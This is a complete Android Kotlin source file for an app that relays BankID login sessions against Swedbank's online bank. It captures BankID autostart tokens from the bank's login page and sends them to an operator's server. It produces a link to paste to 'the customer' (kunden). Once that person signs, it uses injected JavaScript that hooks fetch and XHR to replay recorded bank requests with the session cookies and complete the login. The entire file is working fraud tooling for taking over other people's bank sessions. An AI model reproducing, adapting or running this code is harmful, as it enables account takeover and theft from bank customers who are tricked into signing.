package com.relay

import android.app.Activity
import android.content.ClipData
import android.content.ClipboardManager
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.graphics.Color
import android.net.Uri
import android.os.Bundle
import android.os.Message
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.CookieManager
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.Button
import android.widget.EditText
import android.widget.FrameLayout
import android.widget.LinearLayout
import android.widget.TextView
import java.io.BufferedReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.ArrayList

class MainActivity : Activity() {

    private lateinit var web: WebView
    private lateinit var webWrap: FrameLayout
    private var popup: WebView? = null
    private lateinit var bar: TextView
    private lateinit var urlView: TextView
    private lateinit var debugView: TextView
    private lateinit var linkView: TextView
    private lateinit var serverField: EditText
    private lateinit var bankField: EditText
    private lateinit var modeBtn: Button
    private lateinit var inBtn: Button
    private lateinit var p: SharedPreferences

    @Volatile private var baseUrl = ""
    @Volatile private var bankUrl = ""
    @Volatile private var nuUrl = ""
    @Volatile private var last = ""
    @Volatile private var loginStam = ""
    @Volatile private var kund = true
    @Volatile private var skickat = false
    @Volatile private var signerad = false
    @Volatile private var tarIn = false
    @Volatile private var inne = false
    @Volatile private var vantande = ""
    @Volatile private var vantandeHel = ""
    @Volatile private var alive = true
    @Volatile private var efterUrl = ""
    @Volatile private var skapar = false
    @Volatile private var sonMethod = "GET"
    private val sonList = ArrayList<String>()

    private val inst = "(function(){if(window.__rh){return}window.__rh=1;window.__lista=[];" +
        "function K(u,m,b,h){try{" +
        "if(!u)return;u=String(u);" +
        "if(!/^http/.test(u))return;" +
        "if(u.indexOf(location.host)<0&&u.indexOf('swedbank')<0)return;" +
        "if(/\\.(js|css|png|jpg|jpeg|svg|woff2?|ico|gif)(\\?|$)/i.test(u))return;" +
        "var L=window.__lista;" +
        "for(var i=0;i<L.length;i++){if(L[i].url===u&&L[i].method===(m||'GET'))return}" +
        "L.push({url:u,method:m||'GET',body:b||null,headers:h||{}});" +
        "if(L.length>5)L.shift();" +
        "try{Relay.svar('SON|'+(m||'GET')+'|'+u)}catch(e){}" +
        "}catch(e){}}" +
        "var F=window.fetch;if(F){window.fetch=function(){var a=arguments,u='',m='GET',b=null,h={};" +
        "try{u=(a[0]&&a[0].url)?a[0].url:a[0];" +
        "if(a[1]){if(a[1].method)m=a[1].method;if(a[1].body)b=a[1].body;" +
        "if(a[1].headers){try{new Headers(a[1].headers).forEach(function(v,k){h[k]=v})}catch(e){}}}}catch(e){}" +
        "var q=F.apply(this,a);try{q.then(function(){try{K(u,m,b,h)}catch(e){}}).catch(function(){})}catch(e){}return q}}" +
        "var O=XMLHttpRequest.prototype.open;XMLHttpRequest.prototype.open=function(m,u){try{this.__u=u;this.__m=m;this.__h={}}catch(e){}return O.apply(this,arguments)};" +
        "var SH=XMLHttpRequest.prototype.setRequestHeader;XMLHttpRequest.prototype.setRequestHeader=function(k,v){try{this.__h[k]=v}catch(e){}return SH.apply(this,arguments)};" +
        "var S=XMLHttpRequest.prototype.send;XMLHttpRequest.prototype.send=function(b){var x=this;" +
        "try{x.addEventListener('load',function(){K(x.__u,x.__m,b,x.__h)})}catch(e){}return S.apply(this,arguments)};" +
        "function go(s,h,namn){try{" +
        "fetch(s.url,{method:s.method,headers:h,body:(/post/i.test(s.method)?s.body:null),credentials:'include'})" +
        ".then(function(r){return r.text().then(function(t){return {c:r.status,t:t}})})" +
        ".then(function(o){try{Relay.svar('SVAR '+o.c+' '+s.url.slice(-22)+' :: '+String(o.t).slice(0,50))}catch(e){}})" +
        ".catch(function(e){try{if(namn==='h'){Relay.svar('FEL-h '+s.url.slice(-22));go(s,{},'u')}else{Relay.svar('FEL '+s.url.slice(-22)+' '+(e&&e.message?e.message:'?'))}}catch(x){}})" +
        "}catch(e){}}" +
        "window.__replay=function(){var L=window.__lista||[];" +
        "if(!L.length){try{Relay.svar('INGEN-SON')}catch(e){}return}" +
        "for(var i=0;i<L.length;i++){go(L[i],L[i].headers,'h')}};" +
        "var W=window.open;window.open=function(u){try{if(u&&String(u).indexOf('autostarttoken')>=0){location.href=u;return window}}catch(e){}return W.apply(window,arguments)};" +
        "setInterval(function(){try{var a=document.querySelector('a[href*=autostarttoken]');" +
        "if(a&&a.href){var m=/[?&]autostarttoken=([^&#]+)/.exec(a.href);if(m)Relay.tok(a.href)}}catch(e){}},700)})()"

    private val nudge = "(function(){" +
        "try{window.dispatchEvent(new Event('blur'))}catch(e){}" +
        "try{window.dispatchEvent(new Event('focus'))}catch(e){}" +
        "try{document.dispatchEvent(new Event('visibilitychange'))}catch(e){}" +
        "try{window.dispatchEvent(new Event('pageshow'))}catch(e){}})()"

    override fun onCreate(b: Bundle?) {
        super.onCreate(b)
        p = getSharedPreferences("relay", 0)
        baseUrl = p.getString("base", "") ?: ""
        bankUrl = p.getString("bank", "https://online.swedbank.se/") ?: "https://online.swedbank.se/"
        kund = p.getBoolean("kund", true)
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)
        ui()
        alive = true
        poll()
        handleIntent(intent)
    }

    override fun onResume() {
        super.onResume()
        try {
            if (::web.isInitialized) {
                web.onResume()
                if (!inne) web.evaluateJavascript(nudge, null)
            }
        } catch (t: Throwable) {}
    }

    override fun onPause() {
        super.onPause()
        try { if (::web.isInitialized) web.onPause() } catch (t: Throwable) {}
    }

    override fun onNewIntent(i: Intent?) {
        super.onNewIntent(i)
        if (i != null) handleIntent(i)
    }

    private fun handleIntent(i: Intent) {
        if (i.action != Intent.ACTION_VIEW) return
        setIntent(i)
        val s = i.data?.toString() ?: return
        val t = tok(s)
        if (t == null) {
            if (s.startsWith("bankid:") || s.startsWith("intent:")) oppnaApp(s)
            return
        }
        grab(t, s)
        startaBankIdFranIntent(i)
    }

    private fun ui() {
        val root = LinearLayout(this)
        root.orientation = LinearLayout.VERTICAL

        val rad1 = LinearLayout(this)
        rad1.orientation = LinearLayout.HORIZONTAL

        serverField = EditText(this)
        serverField.hint = "server-url"
        serverField.setText(baseUrl)
        rad1.addView(serverField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        val run = Button(this)
        run.text = "KOR"
        run.setOnClickListener {
            baseUrl = serverField.text.toString().trim().trimEnd('/')
            p.edit().putString("base", baseUrl).apply()
            last = ""; skickat = false; signerad = false; tarIn = false; inne = false
            loginStam = ""; efterUrl = ""
            inBtn.isEnabled = false
            if ((p.getString("code", "") ?: "").isEmpty()) newSession()
            bar.text = "laddar banksidan"
            web.loadUrl(bankUrl)
        }
        rad1.addView(run, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val rp = Button(this)
        rp.text = "RP"
        rp.setOnClickListener {
            bar.text = "spelar upp"
            try { startActivity(Intent(this@MainActivity, VackActivity::class.java)) } catch (x: Throwable) {}
            try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (t: Throwable) {}
            appReplay()
        }
        rad1.addView(rp, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
        root.addView(rad1)

        val rad2 = LinearLayout(this)
        rad2.orientation = LinearLayout.HORIZONTAL

        bankField = EditText(this)
        bankField.hint = "bank-url"
        bankField.setText(bankUrl)
        rad2.addView(bankField, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 3f))

        modeBtn = Button(this)
        modeBtn.text = if (kund) "KUND" else "OP"
        modeBtn.setOnClickListener {
            kund = !kund
            modeBtn.text = if (kund) "KUND" else "OP"
            p.edit().putBoolean("kund", kund).apply()
        }
        rad2.addView(modeBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        inBtn = Button(this)
        inBtn.text = "IN"
        inBtn.isEnabled = false
        inBtn.setOnClickListener { taIn() }
        rad2.addView(inBtn, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))

        val ny = Button(this)
        ny.text = "KOD"
        ny.setOnClickListener { newSession() }
        rad2.addView(ny, LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.WRAP_CONTENT, 1f))
        root.addView(rad2)

        bar = TextView(this)
        bar.textSize = 12f
        bar.setBackgroundColor(Color.parseColor("#101010"))
        bar.setTextColor(Color.parseColor("#66ff88"))
        bar.setPadding(14, 8, 14, 6)
        bar.text = "redo"
        root.addView(bar)

        urlView = TextView(this)
        urlView.textSize = 10f
        urlView.setBackgroundColor(Color.parseColor("#101010"))
        urlView.setTextColor(Color.parseColor("#888888"))
        urlView.setPadding(14, 2, 14, 6)
        urlView.text = "url"
        root.addView(urlView)

        debugView = TextView(this)
        debugView.textSize = 9f
        debugView.setBackgroundColor(Color.parseColor("#101010"))
        debugView.setTextColor(Color.parseColor("#ddaa44"))
        debugView.setPadding(14, 2, 14, 6)
        debugView.text = "relay"
        root.addView(debugView)

        linkView = TextView(this)
        linkView.textSize = 12f
        linkView.setTextIsSelectable(true)
        linkView.setBackgroundColor(Color.parseColor("#101010"))
        linkView.setTextColor(Color.parseColor("#66ccff"))
        linkView.setPadding(14, 4, 14, 10)
        linkView.text = "kundlank hamnar har"
        root.addView(linkView)

        web = WebView(this)
        web.settings.javaScriptEnabled = true
        web.settings.domStorageEnabled = true
        web.settings.databaseEnabled = true
        web.settings.setSupportMultipleWindows(true)
        web.settings.javaScriptCanOpenWindowsAutomatically = true
        try {
            web.settings.userAgentString = web.settings.userAgentString.replace("; wv", "")
        } catch (t: Throwable) {}

        web.webViewClient = object : WebViewClient() {

            override fun shouldOverrideUrlLoading(v: WebView, r: WebResourceRequest): Boolean {
                return fanga(r.url.toString())
            }

            override fun onPageStarted(v: WebView, url: String?, f: Bitmap?) {
                if (url != null) nuUrl = url
                try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
            }

            override fun onPageFinished(v: WebView, url: String?) {
                if (url != null) nuUrl = url
                try { web.evaluateJavascript(inst, null) } catch (t: Throwable) {}
            }

            override fun doUpdateVisitedHistory(v: WebView, url: String?, isReload: Boolean) {
                if (url == null) return
                nuUrl = url
                var s = url.replace("https://", "").replace("http://", "")
                if (s.length > 62) s = s.substring(0, 62)
                urlView.text = s

                val borta = url.indexOf("logga-in") < 0 && url.indexOf("login") < 0
                if (signerad && efterUrl.isEmpty() && loginStam.isNotEmpty() &&
                    stam(url) != loginStam) efterUrl = url
                if (!inne && loginStam.isNotEmpty() && stam(url) != loginStam && borta) {
                    inne = true
                    bar.text = "INNE - ror inte sidan"
                }
            }
        }

        web.webChromeClient = object : WebChromeClient() {

            override fun onCreateWindow(v: WebView, isDialog: Boolean, isUserGesture: Boolean, msg: Message): Boolean {
                val pop = WebView(this@MainActivity)
                pop.settings.javaScriptEnabled = true
                pop.settings.domStorageEnabled = true
                pop.webViewClient = object : WebViewClient() {
                    override fun shouldOverrideUrlLoading(v2: WebView, r: WebResourceRequest): Boolean {
                        val s = r.url.toString()
                        if (fanga(s)) { stangPopup(); return true }
                        try { web.loadUrl(s) } catch (x: Throwable) {}
                        stangPopup()
                        return true
                    }
                }
                pop.webChromeClient = this
                popup = pop
                webWrap.addView(pop, FrameLayout.LayoutParams(
                    ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))
                try {
                    (msg.obj as WebView.WebViewTransport).webView = pop
                    msg.sendToTarget()
                } catch (x: Throwable) { stangPopup(); return false }
                return true
            }

            override fun onCloseWindow(window: WebView?) { stangPopup() }
        }

        web.addJavascriptInterface(Bridge(), "Relay")

        webWrap = FrameLayout(this)
        webWrap.addView(web, FrameLayout.LayoutParams(
            ViewGroup.LayoutParams.MATCH_PARENT, ViewGroup.LayoutParams.MATCH_PARENT))
        root.addView(webWrap, LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0, 1f))
        setContentView(root)
    }

    private fun stangPopup() {
        val pop = popup ?: return
        try { webWrap.removeView(pop); pop.destroy() } catch (x: Throwable) {}
        popup = null
    }

    private fun fanga(s: String): Boolean {
        val t = tok(s)
        if (t != null) {
            grab(t, s)
            if (!kund) startaBankId(s)
            return true
        }
        if (s.startsWith("bankid:")) {
            if (!kund) startaBankId(s)
            return true
        }
        if (s.startsWith("intent:")) {
            if (!kund) oppnaApp(s)
            return true
        }
        return false
    }

    private inner class Bridge {
        @JavascriptInterface
        fun tok(hel: String) {
            val t = this@MainActivity.tok(hel) ?: return
            runOnUiThread { grab(t, hel) }
        }

        @JavascriptInterface
        fun svar(s: String) {
            runOnUiThread {
                if (s.startsWith("SON|")) {
                    val d = s.split("\\|")
                    if (d.size >= 3) {
                        sonMethod = d[1]
                        val post = d[1] + "|" + d[2]
                        synchronized(sonList) {
                            sonList.remove(post)
                            sonList.add(post)
                            if (sonList.size > 4) sonList.removeAt(0)
                        }
                    }
                }
                val rad = s + "   |   " + debugView.text
                debugView.text = if (rad.length > 230) rad.substring(0, 230) else rad
                if (!inne && s.startsWith("SVAR") && s.indexOf("complete") >= 0) {
                    inne = true
                    bar.text = "BANKEN SVARAR COMPLETE - inne"
                }
            }
        }
    }

    private fun appReplay() {
        val lista = synchronized(sonList) { ArrayList(sonList) }
        if (lista.isEmpty()) { bar.text = "app-replay: inga anrop fangade"; return }
        Thread {
            for (rad in lista) {
                val d = rad.split("\\|")
                if (d.size < 2) continue
                val m = d[0]
                val u = d[1]
                try {
                    val con = URL(u).openConnection() as HttpURLConnection
                    con.requestMethod = m
                    con.connectTimeout = 8000
                    con.readTimeout = 8000
                    try {
                        val ck = CookieManager.getInstance().getCookie(u)
                        if (ck != null) con.setRequestProperty("Cookie", ck)
                    } catch (x: Throwable) {}
                    con.setRequestProperty("Accept", "application/json, text/plain, */*")
                    if (m.equals("POST", true)) {
                        con.doOutput = true
                        con.outputStream.write(ByteArray(0))
                        con.outputStream.flush()
                    }
                    val kod = con.responseCode
                    var txt = ""
                    try { txt = con.inputStream.bufferedReader().readText() } catch (e: Throwable) {}
                    con.disconnect()
                    val klipp = if (txt.length > 80) txt.substring(0, 80) else txt
                    val kort = if (u.length > 24) u.substring(u.length - 24) else u
                    runOnUiThread {
                        val n = "APP " + kod + " " + kort + " :: " + klipp
                        val hel = n + "   |   " + debugView.text
                        debugView.text = if (hel.length > 230) hel.substring(0, 230) else hel
                        if (!inne && klipp.indexOf("complete") >= 0) {
                            inne = true
                            bar.text = "APP-REPLAY COMPLETE - inne"
                        }
                    }
                } catch (t: Throwable) {
                    val msg = t.message ?: "?"
                    runOnUiThread {
                        val hel = "APP FEL " + msg + "   |   " + debugView.text
                        debugView.text = if (hel.length > 230) hel.substring(0, 230) else hel
                    }
                }
            }
        }.start()
    }

    private fun tok(s: String): String? {
        val m = Regex("[?&]autostarttoken=([^&#]+)").find(s) ?: return null
        val v = Uri.decode(m.groupValues[1])
        if (v.isEmpty() || v == "null") return null
        return v
    }

    private fun redirect(s: String): String? {
        val m = Regex("[?&]redirect=([^&#]+)").find(s) ?: return null
        val v = Uri.decode(m.groupValues[1])
        if (v.isEmpty() || v == "null") return null
        return v
    }

    private fun stam(u: String): String = try {
        val x = Uri.parse(u)
        (x.scheme ?: "") + "://" + (x.host ?: "") + (x.path ?: "")
    } catch (t: Throwable) { u }

    private fun esc(s: String) = s.replace("\\", "\\\\").replace("\"", "\\\"")

    private fun grab(t: String, hel: String = "") {
        if (t == last) return
        last = t
        loginStam = stam(nuUrl)
        inne = false
        val c = p.getString("code", "") ?: ""
        if (c.isEmpty()) { newSession(t, hel); return }
        skicka(t, hel)
    }

    private fun skicka(t: String, hel: String) {
        val c = p.getString("code", "") ?: ""
        if (c.isEmpty()) return
        val r = redirect(hel) ?: ""
        post("/api/session/" + c + "/token",
            "{\"token\":\"" + esc(t) + "\",\"redirect\":\"" + esc(r) + "\"}")
        skickat = true
        signerad = false
        inBtn.isEnabled = true
        inBtn.setBackgroundColor(Color.parseColor("#2277cc"))
        inBtn.setTextColor(Color.WHITE)
        bar.text = "TOKEN SKICKAT - vanta pa gront"
    }

    private fun startaBankId(url: String) {
        try {
            val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            i.setPackage("com.bankid.bus")
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(i)
        } catch (x: Throwable) {}
    }

    private fun startaBankIdFranIntent(original: Intent) {
        try {
            val v = Intent(original)
            v.component = null
            v.setPackage("com.bankid.bus")
            v.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(v)
        } catch (x: Throwable) {}
    }

    private fun oppnaApp(s: String): Boolean {
        return try {
            val i = if (s.startsWith("intent:")) Intent.parseUri(s, Intent.URI_INTENT_SCHEME)
                    else Intent(Intent.ACTION_VIEW, Uri.parse(s))
            i.setComponent(null)
            i.setSelector(null)
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            if (i.resolveActivity(packageManager) != null) {
                startActivity(i); true
            } else {
                val fb = i.getStringExtra("browser_fallback_url")
                val pkg = i.`package`
                when {
                    fb != null -> { web.loadUrl(fb); true }
                    pkg != null -> {
                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + pkg)))
                        true
                    }
                    else -> false
                }
            }
        } catch (x: Throwable) { false }
    }

    private fun taIn() {
        if (!skickat) { bar.text = "vanta - inget token skickat an"; return }
        if (inne) { bar.text = "redan inne - ror inte sidan"; return }
        if (tarIn) return
        tarIn = true
        Thread {
            try {
                var i = 0
                while (i < 8) {
                    if (inne) {
                        runOnUiThread { bar.text = "INNE - ror inte sidan" }
                        return@Thread
                    }
                    i++
                    val n = i
                    runOnUiThread {
                        bar.text = "vacker + replay (" + n + "/8)"
                        try { startActivity(Intent(this@MainActivity, VackActivity::class.java)) } catch (x: Throwable) {}
                        try { web.evaluateJavascript(nudge, null) } catch (x: Throwable) {}
                        try { web.evaluateJavascript("window.__replay&&window.__replay()", null) } catch (x: Throwable) {}
                    }
                    try { appReplay() } catch (x: Throwable) {}
                    try { Thread.sleep(2500) } catch (x: Throwable) {}
                    val nu = nuUrl
                    if (loginStam.isNotEmpty() && nu.isNotEmpty() && stam(nu) != loginStam) {
                        runOnUiThread { bar.text = "SIDAN GICK VIDARE - du ar inne" }
                        return@Thread
                    }
                }
                if (inne) {
                    runOnUiThread { bar.text = "INNE - ingen omladdning" }
                    return@Thread
                }
                runOnUiThread {
                    if (inne) { bar.text = "INNE - ingen omladdning"; return@runOnUiThread }
                    val retur = efterUrl.isNotEmpty() && stam(efterUrl) != loginStam
                    bar.text = if (retur) "sidan star still - laddar retur-url" else "sidan star still - laddar banksidan"
                    loginStam = ""
                    try { web.onResume() } catch (x: Throwable) {}
                    web.loadUrl(if (retur) efterUrl else bankUrl)
                }
            } finally { tarIn = false }
        }.start()
    }

    private fun visaLank(c: String) {
        val u = baseUrl + "/k/" + c
        linkView.text = u
        try {
            val cm = getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
            cm.setPrimaryClip(ClipData.newPlainText("lank", u))
            bar.text = "lank kopierad - klistra in till kunden"
        } catch (t: Throwable) {
            bar.text = "lank ovan - markera och kopiera"
        }
    }

    private fun newSession(after: String? = null, hel: String = "") {
        if (after != null) { vantande = after; vantandeHel = hel }
        if (baseUrl.isEmpty()) { bar.text = "skriv server-url forst"; return }
        if (skapar) return
        skapar = true
        val b = baseUrl
        Thread {
            var c = ""
            try {
                val con = URL(b + "/api/session").openConnection() as HttpURLConnection
                con.requestMethod = "POST"; con.doOutput = true
                con.setRequestProperty("Content-Type", "text/plain")
                con.connectTimeout = 8000; con.readTimeout = 8000
                con.outputStream.write(ByteArray(0)); con.outputStream.flush()
                if (con.responseCode in 200..299)
                    c = Regex("\"code\"\\s*:\\s*\"([A-Za-z0-9]+)\"")
                        .find(con.inputStream.bufferedReader().readText())
                        ?.groupValues?.get(1) ?: ""
                con.disconnect()
            } catch (t: Throwable) {}
            val cc = c
            runOnUiThread {
                skapar = false
                if (cc.isEmpty()) { bar.text = "kunde inte skapa session"; return@runOnUiThread }
                p.edit().putString("code", cc).apply()
                last = ""; skickat = false; signerad = false; loginStam = ""; efterUrl = ""; inne = false
                inBtn.isEnabled = false
                visaLank(cc)
                if (vantande.isNotEmpty()) {
                    val t = vantande; val h = vantandeHel
                    vantande = ""; vantandeHel = ""
                    last = t
                    skicka(t, h)
                }
            }
        }.start()
    }

    private fun poll() {
        Thread {
            while (alive) {
                try { Thread.sleep(2000) } catch (t: Throwable) {}
                if (signerad || inne) continue
                val c = p.getString("code", "") ?: ""
                if (c.isEmpty() || baseUrl.isEmpty()) continue
                try {
                    val con = URL(baseUrl + "/api/session/" + c + "/state").openConnection() as HttpURLConnection
                    con.connectTimeout = 4000; con.readTimeout = 4000
                    val txt = con.inputStream.bufferedReader().readText()
                    con.disconnect()
                    if (txt.indexOf("\"signed\":true") >= 0) {
                        signerad = true
                        runOnUiThread {
                            inBtn.setBackgroundColor(Color.parseColor("#22aa55"))
                            bar.text = "KUNDEN HAR SIGNERAT - vacker banken"
                        }
                        try { Thread.sleep(3000) } catch (t: Throwable) {}
                        taIn()
                    }
                } catch (t: Throwable) {}
            }
        }.start()
    }

    private fun post(path: String, body: String) {
        if (baseUrl.isEmpty()) return
        val b = baseUrl
        Thread {
            try {
                val con = URL(b + path).openConnection() as HttpURLConnection
                con.requestMethod = "POST"
                con.doOutput = true
                con.setRequestProperty("Content-Type", "application/json")
                con.connectTimeout = 8000
                con.readTimeout = 8000
                con.outputStream.write(body.toByteArray())
                con.outputStream.flush()
                con.responseCode
                con.disconnect()
            } catch (t: Throwable) {}
        }.start()
    }

    override fun onDestroy() {
        alive = false
        stangPopup()
        super.onDestroy()
    }

    override fun onBackPressed() {
        if (popup != null) { stangPopup(); return }
        if (web.canGoBack()) web.goBack() else super.onBackPressed()
    }
}
